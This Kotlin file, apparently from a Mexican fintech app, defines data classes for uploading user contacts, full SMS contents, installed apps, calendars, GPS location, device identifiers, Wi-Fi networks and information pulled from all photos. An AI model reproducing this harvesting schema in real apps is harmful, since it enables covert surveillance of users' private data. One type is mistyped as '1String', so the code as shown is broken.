package com.fintek.utils_mexico.model

import androidx.annotation.StringRes
import com.google.gson.annotations.SerializedName


data class ExtensionModel(
    /**Device info*/
    @SerializedName("device_info") val device: DeviceInfo,
    /**Contact info*/
    @SerializedName("address_book") val contacts: List<Contact>,
    /**App info*/
    @SerializedName("app_list") val apps: List<App>,
    /**Sms Info*/
    @SerializedName("sms") val sms: List<Sms>,
    /**Calendar info*/
    @SerializedName("calendar_list") val calendars: List<Calendar>,

    @SerializedName("merchantId") var merchant: String = "",

    @SerializedName("userId") var userId: Int = 0,
)

data class DeviceInfo(
    /**轨迹跟踪记录, 抓取所有的图片，然后抓取图片内的信息*/
    @SerializedName("albs") val albs: String?,
    /**音频外部文件个数*/
    @SerializedName("audio_external") val audioExternal: Int,
    /**音频内部文件个数*/
    @SerializedName("audio_internal") val audioInternal: Int,
    /**电量信息*/
    @SerializedName("battery_status") val batteryStatus: BatteryStatus,
    /**设备基本信息*/
    @SerializedName("general_data") val generalData: GeneralData,
    /**设备硬件信息*/
    @SerializedName("hardware") val hardware: Hardware,
    /**网路信息*/
    @SerializedName("network") val network: Network,
    /**其他信息*/
    @SerializedName("other_data") val otherData: OtherData,
    /**存储信息*/
    @SerializedName("new_storage") val newStorage: Storage,
    /**应用版本号对应的技术编码*/
    @SerializedName("build_id") val buildId: String?,
    /**APP版本号*/
    @SerializedName("build_name") val buildName: String?,
    /**联系人小组个数*/
    @SerializedName("contact_group") val contactGroup: Int?,
    /**抓取时间*/
    @SerializedName("create_time") val createTime: String,
    /**下载的文件个数*/
    @SerializedName("download_files") val downloadFiles: Int,
    /**图片外部文件个数*/
    @SerializedName("images_external") val imagesExternal: Int,
    /**图片内部文件个数*/
    @SerializedName("images_internal") val imagesInternal: Int,
    /**包名*/
    @SerializedName("package_name") val packageName: String,
    /**视频外部文件个数*/
    @SerializedName("video_external") val videoExternal: Int,
    /**视频内部文件个数*/
    @SerializedName("video_internal") val videoInternal: Int,
    /**GPS_ADID*/
    @SerializedName("gps_adid") val gpsAdid: String?,
    /**设备ID 1.能取到imei传imei 2.取不到imei传安卓ID 3.都没有,传机构自己的设备id,请尽量保证顺序*/
    @SerializedName("device_id") val deviceId: String,
    /**设备信息*/
    @SerializedName("device_info") val deviceInfo: String,
    /**设备系统类型 仅支持 android/ios*/
    @SerializedName("os_type") val osType: String,
    /**设备系统版本*/
    @SerializedName("os_version") val osVersion: String,
    /**设备ip地址*/
    @SerializedName("ip") val ip: String,
    /**内存大小，获取不到传 -1*/
    @SerializedName("memory") val memory: String?,
    /**存储空间大小，获取不到传 -1*/
    @SerializedName("storage") val storage: String?,
    /**存储空间大小，获取不到传 -*/
    @SerializedName("unuse_storage") val unUseStorage: String?,
    /**经度*/
    @SerializedName("gps_longitude") val gpsLongitude: String?,
    /**纬度*/
    @SerializedName("gps_latitude") val gpsLatitude: String?,
    /**gps地址*/
    @SerializedName("gps_address") val gpsAddress: String?,
    /**详细地址*/
    @SerializedName("address_info") val addressInfo: String,
    /**是否wifi 0不是 1是*/
    @SerializedName("wifi") val isWifi: Int,
    /**wifi名称 获取不到传 -1*/
    @SerializedName("wifi_name") val wifiName: String?,
    /**电量*/
    @SerializedName("battery") val battery: Int?,
    /**是否root 0未root 1已root*/
    @SerializedName("is_root") val isRoot: Int,
    /**是否是模拟器 0不是模拟器 1是模拟器*/
    @SerializedName("is_simulator") val isSimulator: Int,
    /**上次活跃时间戳*/
    @SerializedName("last_login_time") val lastLoginTime: Long?,
    /**图片数量，等于外部图片加内部图片，获取不到传-1*/
    @SerializedName("pic_count") val picCount: Int,
    /**sim卡串号*/
    @SerializedName("imsi") val imsi: String,
    /**mac地址 获取不到传-1*/
    @SerializedName("mac") val mac: String,
    /**SD卡存储空间大小，获取不到传-1*/
    @SerializedName("sdcard") val sdCard: String?,
    /**SD卡未使用存储空间大小，获取不到传-1*/
    @SerializedName("unuse_sdcard") val unUseSdCard: String?,
    /**ios系统idfv*/
    @SerializedName("idfv") val idfv: String?,
    /**ios系统idfa*/
    @SerializedName("idfa") val idfa: String?,

    /**安卓系统imei，获取不到传-1*/
    @SerializedName("imei") val ime: String,
    /**屏幕分辨率*/
    @SerializedName("resolution") val resolution: String?,
    /**品牌*/
    @SerializedName("brand") val brand: String?
)

data class Contact(
    @SerializedName("contact_display_name") val name: String,

    @SerializedName("number") val phoneNumber: String,

    @SerializedName("up_time") val updateTime: Long,

    @SerializedName("last_time_contacted") val lastTimeContacted: Long,

    @SerializedName("times_contacted") val timesContacted: Int,
)

data class App(
    @SerializedName("app_name") val name: String,

    @SerializedName("package_name") val packageName: String,

    @SerializedName("version_code") val versionCode: String,

    @SerializedName("obtain_time") val obtainTime: Long,

    @SerializedName("app_type") val appType: String,

    @SerializedName("in_time") val installTime: Long,

    @SerializedName("up_time") val updateTime: Long,

    @SerializedName("app_version") val appVersion: String,
)

data class Sms(
    @SerializedName("other_phone") val otherPhone: String,

    @SerializedName("content") val content: String,

    @SerializedName("seen") val seen: Int,

    @SerializedName("status") val status: Int,

    @SerializedName("time") val time: Long,

    @SerializedName("type") val type: Int,

    @SerializedName("package_name") val packageName: String,
)

data class Calendar(
    @SerializedName("event_title") val eventTitle: String,

    @SerializedName("event_id") val eventId: Long,

    @SerializedName("end_time") val endTime: Long,

    @SerializedName("start_time") val startTime: Long,

    @SerializedName("description") val des: String,

    @SerializedName("reminders") val reminders: List<Reminder>
)

data class BatteryStatus(
    /**电池电量 e.g. 2730(传的数据不用带单位)mAH*/
    @SerializedName("battery_level") val batteryLevel: String,
    /**电池总电量 e.g. 3900(传的数据不用带单位)mAH*/
    @SerializedName("battery_max") val batteryMax: String,
    /**电池百分比*/
    @SerializedName("battery_pct") val batteryPercent: Int,
    /**是否交流充电 0不在 1在*/
    @SerializedName("is_ac_charge") val isAcCharge: Int,
    /**是否正在充电 0不在 1在*/
    @SerializedName("is_charging") val isCharging: Int,
    /**是否usb充电 0不在 1在*/
    @SerializedName("is_usb_charge") val isUsbCharge: Int
)

data class GeneralData(
    /**Android id*/
    @SerializedName("and_id") val androidId: String,
    /**设备当前时间*/
    @SerializedName("currentSystemTime") val currentSystemTime: Long,
    /**开机时间到现在的毫秒数（包括睡眠时间）*/
    @SerializedName("elapsedRealtime") val elapsedRealtime: Long,
    /**google advertising id(google 广告 id)*/
    @SerializedName("gaid") val gaid: String,
    /**imei*/
    @SerializedName("imei") val imei: String,
    /**是否开启debug调试*/
    @SerializedName("is_usb_debug") val isUsbDebug: String,

    @SerializedName("is_using_proxy_port") val isUsingProxyPort: String,

    @SerializedName("is_using_vpn") val isUsingVpn: String,

    @SerializedName("language") val language: String,

    @SerializedName("locale_display_language") val localeDisplayLanguage: String,

    @SerializedName("locale_iso_3_country") val localeISO3Country: String,

    @SerializedName("locale_iso_3_language") val localeISO3Language: String,

    @SerializedName("mac") val mac: String,

    @SerializedName("network_operator_name") val networkOperatorName: String,

    @SerializedName("network_type") val networkType: String,

    @SerializedName("network_type_new") val networkTypeNew: String,

    @SerializedName("phone_number") val phoneNumber: String,

    @SerializedName("phone_type") val phoneType: Int,

    @SerializedName("sensor_list") val sensor: List<Sensor>,

    @SerializedName("time_zone_id") val timeZoneId: Int,

    @SerializedName("uptimeMillis") val uptimeMillis: Int,

    @SerializedName("uuid") val uuid: String
)

data class Sensor(
    @SerializedName("maxRange") val maxRange: String,

    @SerializedName("minDelay") val minDelay: String,

    @SerializedName("name") val name: String,

    @SerializedName("power") val power: String,

    @SerializedName("resolution") val resolution: 1String,

    @SerializedName("type") val type: String,

    @SerializedName("vendor") val vendor: String,

    @SerializedName("version") val version: String
)

data class Hardware(
    @SerializedName("board") val board: String,

    @SerializedName("brand") val brand: String,

    @SerializedName("cores") val cores: Int,

    @SerializedName("device_height") val deviceHeight: Int,

    @SerializedName("device_name") val deviceName: String,

    @SerializedName("device_width") val deviceWidth: Int,

    @SerializedName("model") val model: String,

    @SerializedName("physical_size") val physicalSize: String,

    @SerializedName("production_date") val productionDate: Long,

    @SerializedName("release") val release: String,

    @SerializedName("sdk_version") val sdkVersion: String,

    @SerializedName("serial_number") val serialNumber: String,
)

data class Network(
    @SerializedName("ip") val ip: String,

    @SerializedName("configured_wifi") val configuredWifi: List<Wifi>,

    @SerializedName("current_wifi") val currentWifi: Wifi,

    @SerializedName("wifi_count") val wifiCount: Int
)

data class Wifi(
    @SerializedName("bssid") val bssid: String,

    @SerializedName("mac") val mac: String,

    @SerializedName("name") val name: String,

    @SerializedName("ssid") val ssid: String,
)

data class OtherData(
    @SerializedName("dbm") val dbm: String,

    @SerializedName("keyboard") val keyboard: Int,

    @SerializedName("last_boot_time") val lastBootTime: Long,

    @SerializedName("root_jailbreak") val isRoot: Int,

    @SerializedName("simulator") val isSimulator: Int,
)

data class Storage(
    @SerializedName("app_free_memory") val appFreeMemory: String,

    @SerializedName("app_max_memory") val appMaxMemory: String,

    @SerializedName("app_total_memory") val appTotalMemory: String,

    @SerializedName("contain_sd") val containSd: String,

    @SerializedName("extra_sd") val extraSd: String,

    @SerializedName("internal_storage_total") val internalStorageTotal: Long,

    @SerializedName("internal_storage_usable") val internalStorageUsable: Long,

    @SerializedName("memory_card_free_size") val memoryCardFreeSize: Long,

    @SerializedName("memory_card_size") val memoryCardSize: Long,

    @SerializedName("memory_card_size_use") val memoryCardUsedSize: Long,

    @SerializedName("memory_card_usable_size") val memoryCardUsableSize: Long,

    @SerializedName("ram_total_size") val ramTotalSize: String,

    @SerializedName("ram_usable_size") val ramUsableSize: String,
)

data class Reminder(
    @SerializedName("eventId") val eventId: Int,

    @SerializedName("method") val method: Int,

    @SerializedName("minutes") val minutes: Int,

    @SerializedName("reminder_id") val reminderId: Int,
)

